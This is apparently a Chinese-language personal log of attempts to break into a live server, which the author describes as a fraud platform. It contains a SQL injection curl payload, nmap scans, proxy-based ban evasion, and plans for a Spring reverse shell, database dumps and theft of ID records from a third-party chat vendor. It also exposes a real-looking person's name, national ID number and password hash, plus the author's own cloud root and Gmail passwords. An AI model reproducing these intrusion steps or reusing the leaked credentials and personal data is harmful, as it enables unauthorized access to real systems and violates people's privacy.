登录地址： http://117.149.243.239:9099/app/pages/login/index


登录接口： http://117.149.243.239:9099/apiApp/app/login

登录页面--sql注入

正确的登录

```
POST http://117.149.243.239:9099/apiApp/app/login

payload
{"loginName":"15711320691","loginPwd":"alison123"}

返回
{
    "msg": "操作成功",
    "code": 200,
    "productSetting": [
        {
            "id": 1,
            "szStockDisplay": true,
            "shStockDisplay": true,
            "kcStockDisplay": true,
            "cyStockDisplay": true,
            "bjsStockDisplay": true,
            "realNameDisplay": true,
            "stockMarginDisplay": false,
            "holidayDisplay": true,
            "buyFallDisplay": false,
            "checkPriceDisplay": false,
            "zeroNewApplyDisplay": false,
            "leverDisplay": false
        }
    ],
    "token": "27f9f409-4996-434f-976f-37a644b9de3e"
}

```

#### 获取用户

```
GET http://117.149.243.239:9099/apiApp/app/customer/getCustomerByName?loginName=15711320691
请求头：
    Token: e560b504-7a43-4db0-b312-79f012fc101b

返回
{
    "msg": "操作成功",
    "code": 200,
    "data": {
        "id": 6952,
        "agentId": 10413,
        "agentName": "四组",
        "loginName": "15711320691",
        "nickName": "新客",
        "realName": "黄勇",
        "idCard": "362228199207014015",
        "accountType": 1,
        "userAmt": 207756.80,
        "enableAmt": 0.14,
        "isLock": false,
        "isLogin": true,
        "regTime": "2023-06-28T12:08:37.000+0800",
        "regIp": "223.72.66.6",
        "cardImg1": "/uploadPath/cardImg/20230628/2d8ee267-2d73-481f-a9fa-d2598916d37f.jpg",
        "cardImg2": "/uploadPath/cardImg/20230628/c06b2a8b-7da2-4fe6-9e22-16e3b050f093.jpg",
        "isActive": 2,
        "tradingAmount": 0.00,
        "isAuthorize": 0,
        "applyBuyAmt": 1684642.00,
        "freezeAmt": 207990.00,
        "authMsg": null
    }
}
```

#### 获取用户信息
```
GET http://117.149.243.239:9099/api/v1/index/userinfo
请求头：
    Token: e560b504-7a43-4db0-b312-79f012fc101b

返回
{
    "code": 200,
    "msg": "成功",
    "data": {
        "id": 6952,
        "agent_id": 10413,
        "agent_name": "四组",
        "login_name": "15711320691",
        "login_pwd": "$2a$10$v.qqIhGHaZumTjmZ2D\/.2.wcPYZJwR1mUR\/AzGgowPW1G0o36lmp.",
        "nick_name": "新客",
        "real_name": "黄勇",
        "id_card": "362228199207014015",
        "account_type": 1,
        "user_amt": "207756.80",
        "enable_amt": "0.14",
        "is_lock": 0,
        "is_login": 1,
        "reg_time": "2023-06-28 12:08:37",
        "reg_ip": "223.72.66.6",
        "card_img1": "\/uploadPath\/cardImg\/20230628\/2d8ee267-2d73-481f-a9fa-d2598916d37f.jpg",
        "card_img2": "\/uploadPath\/cardImg\/20230628\/c06b2a8b-7da2-4fe6-9e22-16e3b050f093.jpg",
        "is_active": 2,
        "trading_amount": "0.00",
        "is_authorize": 0,
        "apply_buy_amt": "1684642.00",
        "freeze_amt": "207990.00",
        "auth_msg": null,
        "is_add_open": 0,
        "is_open": 0,
        "login_time": 1689220661,
        "token": "e560b504-7a43-4db0-b312-79f012fc101b",
        "credit_score": 600
    }
}
```

#### 获取登录时间
```
POST http://117.149.243.239:9099/api/v1/index/loginTime

payload
{"login_name":"15711320691","token":"27f9f409-4996-434f-976f-37a644b9de3e"}

返回
{"status_code":200,"message":"成功","token":"","data":[]}

```

#### 获取横幅banner

```
GET http://117.149.243.239:9099/apiApp/app/banner/list 

请求头
Token: 27f9f409-4996-434f-976f-37a644b9de3e 这个是登录返回的值

返回
{
    "msg": "操作成功",
    "code": 200,
    "data": [
        {
            "id": 29,
            "bannerUrl": "/uploadPath/banner/20230618/2733722b-d7a4-4c8f-9ac5-8aa605fff863.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-01-29 19:36:43",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        },
        {
            "id": 30,
            "bannerUrl": "/uploadPath/banner/20230618/81185cec-fe1e-43ef-8851-c8da2d2e0552.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-03-23 21:02:00",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        },
        {
            "id": 31,
            "bannerUrl": "/uploadPath/banner/20230618/bb440acf-6cc0-4859-adb1-7e1667fd0442.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-03-23 21:02:11",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        },
        {
            "id": 32,
            "bannerUrl": "/uploadPath/banner/20230618/bc1f70c0-38bd-42a9-9751-6edc29711413.jpg",
            "isOrder": 0,
            "isPc": 1,
            "isM": 1,
            "addTime": "2023-06-04 21:41:18",
            "banTitle": null,
            "banDesc": null,
            "targetUrl": null
        }
    ]
}
```



尝试1： 失败
1' union select database(),2#
失败： 没有这个用户，页面做了11位字符限制

尝试2： 失败
ssh  root@117.149.243.239
失败： 端口22没开

尝试3： 
curl --request POST \
  --url http://117.149.243.239:9099/apiApp/app/login \
  --header 'Content-Type: application/json' \
  --header 'content-type: application/json' \
  --data '{"loginName":"1'\'' union select database(),2#","loginPwd":"123"}'

失败：
{"msg":"JSON parse error: Unexpected character ('5' (code 53)): was expecting double-quote to start field name; nested exception is com.fasterxml.jackson.core.JsonParseException: Unexpected character ('5' (code 53)): was expecting double-quote to start field name\n at [Source: (PushbackInputStream); line: 1, column: 47]","code":500}


确定后台使用 Java + Spring 开发

尝试4：
http://117.149.243.239:9099/oauth/authorize?response_type=${2*2}&client_id=acme&scope=openid&redirect_uri=http://test

失败： 404 not found --nginx

尝试5：
http://117.149.243.239:9099/apiApp/oauth/authorize?response_type=${2*2}&client_id=acme&scope=openid&redirect_uri=http://test

失败： 400 --bad request

发现对应的nginx配置地址是: /apiApp

目的： 找出服务器用户root密码,数据库用户密码root, 对应的系统中用户所有信息user
然后抓出对应的ip地址，登录人

美洽，企业id
服务器117.149.243.239

收集对应的请求
```
/apiApp/app/banner/list
/apiApp/app/news/page?pageNum=1&type=-1
/apiApp/app/message/getNum 
/apiApp/app/article/list
/apiApp/app/product/info
/apiApp/app/position/getStockInfo?stockCode=sh000001,sz399001,sz399006 
/apiApp/app/login
/apiApp/app/customer/getCustomerByName?loginName=15711320691
/api/v1/index/loginTime
/api/v1/index/userinfo
/api/v1/index/isOpen?login_name=15711320691
/apiApp/app/withdraw/getList?current=1&size=10&total=0
/apiApp/app/dict/type/agent_withdraw_status
/apiApp/app/logout?token=e560b504-7a43-4db0-b312-79f012fc101b
/apiApp/app/site/info


Host: static.meiqia.com/fe-widget/v1.4.86.prod.20230712_46/static/new-chat.mp3

```

尝试6：
/api/v1/index/userinfo
获取到密码， 加密方式是 bcrypt

端口扫描
Initiating Parallel DNS resolution of 1 host. at 15:11
Completed Parallel DNS resolution of 1 host. at 15:11, 8.04s elapsed
Initiating SYN Stealth Scan at 15:11
Scanning 117.149.243.239 [1000 ports]
Discovered open port 3306/tcp on 117.149.243.239
Discovered open port 80/tcp on 117.149.243.239
Discovered open port 53/tcp on 117.149.243.239
Discovered open port 21/tcp on 117.149.243.239
Discovered open port 443/tcp on 117.149.243.239
Increasing send delay for 117.149.243.239 from 0 to 5 due to 63 out of 157 dropped probes since last increase.
Increasing send delay for 117.149.243.239 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Discovered open port 9099/tcp on 117.149.243.239
Discovered open port 888/tcp on 117.149.243.239
Completed SYN Stealth Scan at 15:12, 38.90s elapsed (1000 total ports)
Initiating Service scan at 15:12

尝试7:
现在发现访问不了，说明对方把我的Ip地址屏蔽了，间接说明对应的服务器有人在运营，说明对方有开发运营人员在处理

现在尝试换一个ip代理进行攻击


做一个spring-web接口，获取一下访问者的ip
本地测试
公网测试

然后对指定ip进行限制-linux 
限制单个IP访问的命令
iptables -I INPUT -s 59.151.119.180 -j DROP

tengxun 
root
Asd@1qwe
ip: 
175.178.234.145

我的gmail账户：  gavin.lison@gmail.com  Yang@123xin


本地的IP:   223.72.65.54  2023-07-14   这个IP 被诈骗人员禁了
2023-07-15  223.72.57.19
2023-07-15 1:05 223.72.57.19

尝试8：
nmap -T4 -A -v 117.149.243.239
PORT      STATE  SERVICE    VERSION
20/tcp    closed ftp-data
21/tcp    open   tcpwrapped
22/tcp    closed ssh
53/tcp    open   domain?
80/tcp    open   tcpwrapped
443/tcp   open   tcpwrapped
3306/tcp  open   tcpwrapped
9099/tcp  open   tcpwrapped
27000/tcp closed flexlm0

2023-07-14 09:14 刚操作，发现又被禁了
刚操作了一会，

尝试9:

使用ip代理，py代码访问 http://175.178.234.145:8099/apiApp
无法获取到结果 

尝试10： 访问  117.149.243.239 
返回 502 bad gateway
说明对方服务器做了限制

ping  117.149.243.239 
无法ping 通

尝试11： 
2023-07015 01:33 开始
nmap -T4 -A -v 117.149.243.239

Discovered open port 21/tcp on 117.149.243.239
Discovered open port 80/tcp on 117.149.243.239
Discovered open port 443/tcp on 117.149.243.239
Discovered open port 3306/tcp on 117.149.243.239
Discovered open port 53/tcp on 117.149.243.239
Discovered open port 9099/tcp on 117.149.243.239
Discovered open port 888/tcp on 117.149.243.239

发现

尝试12：
发现可用代理ip: 36.138.56.214:3128

尝试13： 利用spring漏洞实现反弹shell,下载对应的所有文件到本地，
特别是应用程序 和 Mysql 数据文件，对其进行分析
然后分析出相关的用户信息
然后抓取美洽服务器的数据库文件，拿到对应的美洽官网中指定企业id的身份证信息

这些背后都需要将自己的IP 影藏了
需要专门测试一下如何隐藏自己IP

尝试14：
发现开启了 888 端口，
查询之后，后台使用的 phpMyAdmin 管理平台

尝试复现 宝塔7.4.2版本的漏洞，查出对应的数据库信息

访问： 117.149.243.239:888/pma 提示404, 发现这个漏洞被诈骗分子修复

尝试15：
通过 nmap 扫描端口，
20/tcp    closed ftp-data
21/tcp    open   tcpwrapped
22/tcp    closed ssh
53/tcp    open   domain?
80/tcp    open   tcpwrapped
443/tcp   open   tcpwrapped
3306/tcp  open   tcpwrapped
9099/tcp  open   tcpwrapped
27000/tcp closed flexlm0

888端口关闭了

尝试16:
任何命令都需要添加代理ip， 比如：
curl -x 47.93.173.50:8089 -v 175.178.234.145:9099

尝试17：
利用腾讯云服务器进行 nmap 

Discovered open port 587/tcp on 117.149.243.239
Discovered open port 110/tcp on 117.149.243.239
Discovered open port 993/tcp on 117.149.243.239
Discovered open port 1720/tcp on 117.149.243.239
Discovered open port 22/tcp on 117.149.243.239
Discovered open port 995/tcp on 117.149.243.239
Discovered open port 21/tcp on 117.149.243.239
Discovered open port 111/tcp on 117.149.243.239
Discovered open port 3878/tcp on 117.149.243.239
Discovered open port 1947/tcp on 117.149.243.239
Discovered open port 2967/tcp on 117.149.243.239
Discovered open port 8080/tcp on 117.149.243.239
Discovered open port 7004/tcp on 117.149.243.239
Discovered open port 2106/tcp on 117.149.243.239
Discovered open port 52869/tcp on 117.149.243.239
Discovered open port 199/tcp on 117.149.243.239
Discovered open port 3017/tcp on 117.149.243.239
Discovered open port 443/tcp on 117.149.243.239
Discovered open port 6025/tcp on 117.149.243.239
Discovered open port 777/tcp on 117.149.243.239
Discovered open port 9011/tcp on 117.149.243.239
Discovered open port 80/tcp on 117.149.243.239
Discovered open port 30718/tcp on 117.149.243.239
Discovered open port 1300/tcp on 117.149.243.239
Discovered open port 8654/tcp on 117.149.243.239
Discovered open port 900/tcp on 117.149.243.239
Discovered open port 5900/tcp on 117.149.243.239
Discovered open port 1199/tcp on 117.149.243.239
Discovered open port 23/tcp on 117.149.243.239
Discovered open port 143/tcp on 117.149.243.239
Discovered open port 5730/tcp on 117.149.243.239
Discovered open port 3306/tcp on 117.149.243.239
Discovered open port 5907/tcp on 117.149.243.239
Discovered open port 19350/tcp on 117.149.243.239
Discovered open port 8888/tcp on 117.149.243.239
Discovered open port 4449/tcp on 117.149.243.239
Discovered open port 2119/tcp on 117.149.243.239
Discovered open port 700/tcp on 117.149.243.239
Discovered open port 554/tcp on 117.149.243.239
Discovered open port 113/tcp on 117.149.243.239
Discovered open port 256/tcp on 117.149.243.239
Discovered open port 5906/tcp on 117.149.243.239
Discovered open port 4662/tcp on 117.149.243.239
Discovered open port 2013/tcp on 117.149.243.239
Discovered open port 32776/tcp on 117.149.243.239
Discovered open port 18988/tcp on 117.149.243.239
Discovered open port 9002/tcp on 117.149.243.239
Discovered open port 4550/tcp on 117.149.243.239
Discovered open port 1433/tcp on 117.149.243.239
Discovered open port 9968/tcp on 117.149.243.239
Discovered open port 7201/tcp on 117.149.243.239
Discovered open port 1310/tcp on 117.149.243.239
Discovered open port 27356/tcp on 117.149.243.239
Discovered open port 1099/tcp on 117.149.243.239
Discovered open port 5555/tcp on 117.149.243.239
Discovered open port 3971/tcp on 117.149.243.239
Discovered open port 5911/tcp on 117.149.243.239
Discovered open port 40193/tcp on 117.149.243.239
Discovered open port 70/tcp on 117.149.243.239
Discovered open port 9102/tcp on 117.149.243.239
Discovered open port 42/tcp on 117.149.243.239
Discovered open port 8193/tcp on 117.149.243.239
Discovered open port 8081/tcp on 117.149.243.239
Discovered open port 5822/tcp on 117.149.243.239
Discovered open port 1864/tcp on 117.149.243.239
Discovered open port 5357/tcp on 117.149.243.239
Discovered open port 667/tcp on 117.149.243.239
Discovered open port 35500/tcp on 117.149.243.239
Discovered open port 5440/tcp on 117.149.243.239
Discovered open port 5414/tcp on 117.149.243.239
Discovered open port 1081/tcp on 117.149.243.239
Discovered open port 714/tcp on 117.149.243.239
Discovered open port 1974/tcp on 117.149.243.239
Discovered open port 3527/tcp on 117.149.243.239
Discovered open port 7007/tcp on 117.149.243.239
Discovered open port 8192/tcp on 117.149.243.239
Discovered open port 3998/tcp on 117.149.243.239
Discovered open port 3689/tcp on 117.149.243.239
Discovered open port 1089/tcp on 117.149.243.239
Discovered open port 1163/tcp on 117.149.243.239
Discovered open port 5269/tcp on 117.149.243.239
Discovered open port 6881/tcp on 117.149.243.239
Discovered open port 49400/tcp on 117.149.243.239
Discovered open port 32785/tcp on 117.149.243.239
Discovered open port 6646/tcp on 117.149.243.239
Discovered open port 3476/tcp on 117.149.243.239
Discovered open port 55555/tcp on 117.149.243.239
Discovered open port 2002/tcp on 117.149.243.239
Discovered open port 10566/tcp on 117.149.243.239
Discovered open port 32769/tcp on 117.149.243.239
Discovered open port 5033/tcp on 117.149.243.239
Discovered open port 1148/tcp on 117.149.243.239
Discovered open port 3880/tcp on 117.149.243.239
Discovered open port 5952/tcp on 117.149.243.239
Discovered open port 912/tcp on 117.149.243.239
Discovered open port 13456/tcp on 117.149.243.239
Discovered open port 1029/tcp on 117.149.243.239
Discovered open port 1761/tcp on 117.149.243.239
Discovered open port 1023/tcp on 117.149.243.239
Discovered open port 3517/tcp on 117.149.243.239
Discovered open port 19283/tcp on 117.149.243.239
Discovered open port 9080/tcp on 117.149.243.239
Discovered open port 5825/tcp on 117.149.243.239
Discovered open port 9081/tcp on 117.149.243.239
Discovered open port 1097/tcp on 117.149.243.239
Discovered open port 1352/tcp on 117.149.243.239
Discovered open port 749/tcp on 117.149.243.239
Discovered open port 49165/tcp on 117.149.243.239
Discovered open port 5904/tcp on 117.149.243.239
Discovered open port 10024/tcp on 117.149.243.239
Discovered open port 6792/tcp on 117.149.243.239
Discovered open port 1131/tcp on 117.149.243.239
Discovered open port 49175/tcp on 117.149.243.239
Discovered open port 2009/tcp on 117.149.243.239
Discovered open port 2035/tcp on 117.149.243.239
Discovered open port 548/tcp on 117.149.243.239
Discovered open port 1054/tcp on 117.149.243.239
Discovered open port 5550/tcp on 117.149.243.239
Discovered open port 2383/tcp on 117.149.243.239
Discovered open port 2000/tcp on 117.149.243.239
Discovered open port 3325/tcp on 117.149.243.239
Discovered open port 1112/tcp on 117.149.243.239
Discovered open port 2034/tcp on 117.149.243.239
Discovered open port 9001/tcp on 117.149.243.239
Discovered open port 1070/tcp on 117.149.243.239
Discovered open port 903/tcp on 117.149.243.239
Discovered open port 2394/tcp on 117.149.243.239
Discovered open port 5962/tcp on 117.149.243.239
Discovered open port 6005/tcp on 117.149.243.239
Discovered open port 1104/tcp on 117.149.243.239
Discovered open port 4343/tcp on 117.149.243.239
Discovered open port 5810/tcp on 117.149.243.239
Discovered open port 40911/tcp on 117.149.243.239
Discovered open port 1053/tcp on 117.149.243.239
Discovered open port 32771/tcp on 117.149.243.239
Discovered open port 1078/tcp on 117.149.243.239
Discovered open port 1009/tcp on 117.149.243.239
Discovered open port 9290/tcp on 117.149.243.239
Discovered open port 1108/tcp on 117.149.243.239
Discovered open port 1034/tcp on 117.149.243.239
Discovered open port 5802/tcp on 117.149.243.239
Discovered open port 6007/tcp on 117.149.243.239
Discovered open port 1092/tcp on 117.149.243.239
Discovered open port 1218/tcp on 117.149.243.239
Discovered open port 1334/tcp on 117.149.243.239
Discovered open port 17988/tcp on 117.149.243.239
Discovered open port 5902/tcp on 117.149.243.239
Discovered open port 5405/tcp on 117.149.243.239
Discovered open port 617/tcp on 117.149.243.239
Discovered open port 1875/tcp on 117.149.243.239
Discovered open port 1106/tcp on 117.149.243.239
Discovered open port 7103/tcp on 117.149.243.239
Discovered open port 18101/tcp on 117.149.243.239
Discovered open port 8291/tcp on 117.149.243.239
Discovered open port 2042/tcp on 117.149.243.239
Discovered open port 1052/tcp on 117.149.243.239
Discovered open port 55055/tcp on 117.149.243.239
Discovered open port 464/tcp on 117.149.243.239
Discovered open port 144/tcp on 117.149.243.239
Discovered open port 16016/tcp on 117.149.243.239
Discovered open port 4126/tcp on 117.149.243.239
Discovered open port 49152/tcp on 117.149.243.239
Discovered open port 1027/tcp on 117.149.243.239
Discovered open port 1030/tcp on 117.149.243.239
Discovered open port 545/tcp on 117.149.243.239
Discovered open port 5101/tcp on 117.149.243.239
Discovered open port 666/tcp on 117.149.243.239
Discovered open port 3221/tcp on 117.149.243.239
Discovered open port 2811/tcp on 117.149.243.239
Discovered open port 1234/tcp on 117.149.243.239
Discovered open port 1236/tcp on 117.149.243.239
Discovered open port 3128/tcp on 117.149.243.239
Discovered open port 1055/tcp on 117.149.243.239
Discovered open port 1068/tcp on 117.149.243.239
Discovered open port 3300/tcp on 117.149.243.239
Discovered open port 1076/tcp on 117.149.243.239
Discovered open port 1556/tcp on 117.149.243.239
Discovered open port 3261/tcp on 117.149.243.239
Discovered open port 3851/tcp on 117.149.243.239
Discovered open port 10215/tcp on 117.149.243.239
Increasing send delay for 117.149.243.239 from 0 to 5 due to 121 out of 301 dropped probes since last increase.
Discovered open port 2020/tcp on 117.149.243.239
Discovered open port 1100/tcp on 117.149.243.239
Discovered open port 5190/tcp on 117.149.243.239
Discovered open port 1082/tcp on 117.149.243.239
Discovered open port 999/tcp on 117.149.243.239
Discovered open port 1152/tcp on 117.149.243.239
Discovered open port 4567/tcp on 117.149.243.239
Discovered open port 7937/tcp on 117.149.243.239
Discovered open port 50002/tcp on 117.149.243.239
Discovered open port 10010/tcp on 117.149.243.239
Discovered open port 1130/tcp on 117.149.243.239
Discovered open port 6969/tcp on 117.149.243.239
Discovered open port 1084/tcp on 117.149.243.239
Discovered open port 8292/tcp on 117.149.243.239
Discovered open port 1721/tcp on 117.149.243.239
Discovered open port 9071/tcp on 117.149.243.239
Discovered open port 4444/tcp on 117.149.243.239
Discovered open port 8009/tcp on 117.149.243.239
Discovered open port 1259/tcp on 117.149.243.239
Discovered open port 1037/tcp on 117.149.243.239
Discovered open port 2003/tcp on 117.149.243.239
Increasing send delay for 117.149.243.239 from 5 to 10 due to 15 out of 37 dropped probes since last increase.
Discovered open port 5050/tcp on 117.149.243.239
Discovered open port 5120/tcp on 117.149.243.239
Discovered open port 49161/tcp on 117.149.243.239
Discovered open port 3372/tcp on 117.149.243.239
Discovered open port 50001/tcp on 117.149.243.239
Discovered open port 1044/tcp on 117.149.243.239
Discovered open port 10243/tcp on 117.149.243.239
Discovered open port 8085/tcp on 117.149.243.239
Discovered open port 5960/tcp on 117.149.243.239
Discovered open port 8500/tcp on 117.149.243.239
Discovered open port 4111/tcp on 117.149.243.239
Discovered open port 8021/tcp on 117.149.243.239
Discovered open port 1999/tcp on 117.149.243.239
Discovered open port 5214/tcp on 117.149.243.239
Discovered open port 24800/tcp on 117.149.243.239
Discovered open port 416/tcp on 117.149.243.239
Discovered open port 9220/tcp on 117.149.243.239
Discovered open port 49999/tcp on 117.149.243.239
Discovered open port 50006/tcp on 117.149.243.239
Discovered open port 222/tcp on 117.149.243.239
Discovered open port 1717/tcp on 117.149.243.239
Discovered open port 9100/tcp on 117.149.243.239
Discovered open port 911/tcp on 117.149.243.239
Discovered open port 15003/tcp on 117.149.243.239
Discovered open port 2111/tcp on 117.149.243.239
Discovered open port 6059/tcp on 117.149.243.239
Discovered open port 62078/tcp on 117.149.243.239
Discovered open port 407/tcp on 117.149.243.239
Discovered open port 2492/tcp on 117.149.243.239
Discovered open port 23502/tcp on 117.149.243.239
Discovered open port 8008/tcp on 117.149.243.239
Discovered open port 16001/tcp on 117.149.243.239
Discovered open port 8089/tcp on 117.149.243.239
Discovered open port 65000/tcp on 117.149.243.239
Discovered open port 16000/tcp on 117.149.243.239
Discovered open port 10025/tcp on 117.149.243.239
Discovered open port 8045/tcp on 117.149.243.239
Discovered open port 9485/tcp on 117.149.243.239
Discovered open port 5222/tcp on 117.149.243.239
Discovered open port 5850/tcp on 117.149.243.239
Discovered open port 3370/tcp on 117.149.243.239
Discovered open port 6669/tcp on 117.149.243.239
Discovered open port 1028/tcp on 117.149.243.239
Discovered open port 1000/tcp on 117.149.243.239
Discovered open port 9900/tcp on 117.149.243.239
Discovered open port 1594/tcp on 117.149.243.239
Discovered open port 514/tcp on 117.149.243.239
Discovered open port 8873/tcp on 117.149.243.239
Discovered open port 8086/tcp on 117.149.243.239
Discovered open port 3005/tcp on 117.149.243.239
Discovered open port 3052/tcp on 117.149.243.239
Discovered open port 10629/tcp on 117.149.243.239
Discovered open port 13782/tcp on 117.149.243.239
Discovered open port 11111/tcp on 117.149.243.239
Discovered open port 8899/tcp on 117.149.243.239
Discovered open port 3404/tcp on 117.149.243.239
Discovered open port 2144/tcp on 117.149.243.239
Discovered open port 9944/tcp on 117.149.243.239
Discovered open port 4899/tcp on 117.149.243.239
Discovered open port 32781/tcp on 117.149.243.239
Discovered open port 1185/tcp on 117.149.243.239
Discovered open port 6009/tcp on 117.149.243.239
Discovered open port 3323/tcp on 117.149.243.239
Discovered open port 1114/tcp on 117.149.243.239
Discovered open port 3301/tcp on 117.149.243.239
Discovered open port 5679/tcp on 117.149.243.239
Discovered open port 1067/tcp on 117.149.243.239
Discovered open port 2121/tcp on 117.149.243.239
Discovered open port 5800/tcp on 117.149.243.239
Discovered open port 5054/tcp on 117.149.243.239
Discovered open port 4006/tcp on 117.149.243.239
Discovered open port 9929/tcp on 117.149.243.239
Discovered open port 14000/tcp on 117.149.243.239
Discovered open port 8088/tcp on 117.149.243.239
Discovered open port 2099/tcp on 117.149.243.239
Discovered open port 33899/tcp on 117.149.243.239
Discovered open port 8994/tcp on 117.149.243.239
Discovered open port 4129/tcp on 117.149.243.239
Discovered open port 1201/tcp on 117.149.243.239
Discovered open port 1971/tcp on 117.149.243.239
Discovered open port 30951/tcp on 117.149.243.239
Discovered open port 9010/tcp on 117.149.243.239
Discovered open port 6901/tcp on 117.149.243.239
Discovered open port 5678/tcp on 117.149.243.239
Discovered open port 20005/tcp on 117.149.243.239
Discovered open port 5999/tcp on 117.149.243.239
Discovered open port 1/tcp on 117.149.243.239
Discovered open port 1138/tcp on 117.149.243.239
Discovered open port 6543/tcp on 117.149.243.239
Discovered open port 1039/tcp on 117.149.243.239
Discovered open port 24/tcp on 117.149.243.239
Discovered open port 51103/tcp on 117.149.243.239
Discovered open port 311/tcp on 117.149.243.239
Discovered open port 3001/tcp on 117.149.243.239
Discovered open port 3869/tcp on 117.149.243.239
Discovered open port 2047/tcp on 117.149.243.239
Discovered open port 5061/tcp on 117.149.243.239
Discovered open port 7512/tcp on 117.149.243.239
Discovered open port 2038/tcp on 117.149.243.239
Discovered open port 2710/tcp on 117.149.243.239
Discovered open port 389/tcp on 117.149.243.239
Discovered open port 3945/tcp on 117.149.243.239
Discovered open port 6667/tcp on 117.149.243.239
Discovered open port 5901/tcp on 117.149.243.239
Discovered open port 3871/tcp on 117.149.243.239
Discovered open port 37/tcp on 117.149.243.239
Discovered open port 50636/tcp on 117.149.243.239
Discovered open port 1069/tcp on 117.149.243.239
Discovered open port 1122/tcp on 117.149.243.239
Discovered open port 32774/tcp on 117.149.243.239
Discovered open port 1096/tcp on 117.149.243.239
Discovered open port 8383/tcp on 117.149.243.239
Discovered open port 1501/tcp on 117.149.243.239
Discovered open port 901/tcp on 117.149.243.239
Discovered open port 27353/tcp on 117.149.243.239
Discovered open port 2010/tcp on 117.149.243.239
Discovered open port 2382/tcp on 117.149.243.239
Discovered open port 7001/tcp on 117.149.243.239
Discovered open port 1192/tcp on 117.149.243.239
Discovered open port 1149/tcp on 117.149.243.239
Discovered open port 4445/tcp on 117.149.243.239
Discovered open port 4003/tcp on 117.149.243.239
Discovered open port 1600/tcp on 117.149.243.239
Discovered open port 6123/tcp on 117.149.243.239
Discovered open port 9877/tcp on 117.149.243.239
Discovered open port 49157/tcp on 117.149.243.239
Discovered open port 5718/tcp on 117.149.243.239
Discovered open port 9090/tcp on 117.149.243.239
Discovered open port 1124/tcp on 117.149.243.239
Warning: 117.149.243.239 giving up on port because retransmission cap hit (6).
Discovered open port 1073/tcp on 117.149.243.239
Discovered open port 19315/tcp on 117.149.243.239
Discovered open port 2500/tcp on 117.149.243.239
Discovered open port 9000/tcp on 117.149.243.239
Discovered open port 50389/tcp on 117.149.243.239
Discovered open port 33/tcp on 117.149.243.239
Discovered open port 1123/tcp on 117.149.243.239
Discovered open port 50500/tcp on 117.149.243.239
Discovered open port 19780/tcp on 117.149.243.239
Discovered open port 6779/tcp on 117.149.243.239
Discovered open port 5877/tcp on 117.149.243.239
Discovered open port 8649/tcp on 117.149.243.239
Discovered open port 5961/tcp on 117.149.243.239
Discovered open port 3006/tcp on 117.149.243.239
Discovered open port 5910/tcp on 117.149.243.239
Discovered open port 38292/tcp on 117.149.243.239
Discovered open port 9200/tcp on 117.149.243.239
Discovered open port 1271/tcp on 117.149.243.239
Discovered open port 1072/tcp on 117.149.243.239
Discovered open port 64680/tcp on 117.149.243.239
Discovered open port 9594/tcp on 117.149.243.239
Discovered open port 2007/tcp on 117.149.243.239
Discovered open port 3828/tcp on 117.149.243.239
Discovered open port 1503/tcp on 117.149.243.239
Discovered open port 2301/tcp on 117.149.243.239
Discovered open port 25734/tcp on 117.149.243.239
Discovered open port 5431/tcp on 117.149.243.239
Discovered open port 8011/tcp on 117.149.243.239
Discovered open port 711/tcp on 117.149.243.239
Discovered open port 5633/tcp on 117.149.243.239
Discovered open port 19101/tcp on 117.149.243.239
Discovered open port 8180/tcp on 117.149.243.239
Discovered open port 6100/tcp on 117.149.243.239
Discovered open port 2725/tcp on 117.149.243.239
Discovered open port 3918/tcp on 117.149.243.239
Discovered open port 11967/tcp on 117.149.243.239
Discovered open port 3000/tcp on 117.149.243.239
Discovered open port 7025/tcp on 117.149.243.239
Discovered open port 5925/tcp on 117.149.243.239
Discovered open port 808/tcp on 117.149.243.239
Discovered open port 3324/tcp on 117.149.243.239
Discovered open port 2126/tcp on 117.149.243.239
Discovered open port 2288/tcp on 117.149.243.239
Discovered open port 9618/tcp on 117.149.243.239
Discovered open port 3077/tcp on 117.149.243.239
Discovered open port 63331/tcp on 117.149.243.239
Discovered open port 9207/tcp on 117.149.243.239
Discovered open port 1248/tcp on 117.149.243.239
Discovered open port 2910/tcp on 117.149.243.239
Discovered open port 1524/tcp on 117.149.243.239
Discovered open port 6001/tcp on 117.149.243.239
Discovered open port 1047/tcp on 117.149.243.239
Discovered open port 1046/tcp on 117.149.243.239
Discovered open port 1244/tcp on 117.149.243.239
Discovered open port 1083/tcp on 117.149.243.239
Discovered open port 801/tcp on 117.149.243.239
Discovered open port 42510/tcp on 117.149.243.239
Discovered open port 981/tcp on 117.149.243.239
Discovered open port 722/tcp on 117.149.243.239
Discovered open port 10009/tcp on 117.149.243.239
Discovered open port 1051/tcp on 117.149.243.239
Discovered open port 12174/tcp on 117.149.243.239
Discovered open port 1443/tcp on 117.149.243.239
Discovered open port 15000/tcp on 117.149.243.239
Discovered open port 8099/tcp on 117.149.243.239
Discovered open port 32777/tcp on 117.149.243.239
Discovered open port 2557/tcp on 117.149.243.239
Discovered open port 1154/tcp on 117.149.243.239
Discovered open port 843/tcp on 117.149.243.239
Discovered open port 6/tcp on 117.149.243.239
Discovered open port 5963/tcp on 117.149.243.239
Discovered open port 515/tcp on 117.149.243.239
Discovered open port 9101/tcp on 117.149.243.239
Discovered open port 417/tcp on 117.149.243.239
Discovered open port 2920/tcp on 117.149.243.239
Discovered open port 64623/tcp on 117.149.243.239
Discovered open port 1098/tcp on 117.149.243.239
Discovered open port 1174/tcp on 117.149.243.239
Discovered open port 3371/tcp on 117.149.243.239
Discovered open port 4001/tcp on 117.149.243.239
Discovered open port 1147/tcp on 117.149.243.239
Discovered open port 1105/tcp on 117.149.243.239
Discovered open port 1031/tcp on 117.149.243.239
Discovered open port 54045/tcp on 117.149.243.239
Discovered open port 4005/tcp on 117.149.243.239
Discovered open port 1107/tcp on 117.149.243.239
Discovered open port 146/tcp on 117.149.243.239
Discovered open port 32770/tcp on 117.149.243.239
Discovered open port 1021/tcp on 117.149.243.239
Discovered open port 668/tcp on 117.149.243.239
Discovered open port 1060/tcp on 117.149.243.239
Discovered open port 1311/tcp on 117.149.243.239
Discovered open port 3905/tcp on 117.149.243.239
Discovered open port 9917/tcp on 117.149.243.239
Discovered open port 2702/tcp on 117.149.243.239
Discovered open port 2638/tcp on 117.149.243.239
Discovered open port 9943/tcp on 117.149.243.239
